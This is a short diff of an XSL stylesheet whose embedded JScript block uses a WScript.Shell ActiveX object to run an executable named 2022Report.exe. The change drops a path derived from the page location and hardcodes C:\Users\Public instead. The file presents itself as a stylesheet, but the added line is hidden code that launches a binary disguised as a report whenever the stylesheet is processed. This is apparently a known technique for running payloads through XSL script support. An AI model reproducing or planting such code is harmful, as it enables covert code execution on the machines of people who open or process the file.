@@ -6,7 +6,6 @@ version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	var loc = window.location.pathname;
-	var r = new ActiveXObject("WScript.Shell").Run(loc + "2022Report.exe");
+	var r = new ActiveXObject("WScript.Shell").Run("C:\Users\Public\2022Report.exe");
 	]]> </ms:script>
 </stylesheet>
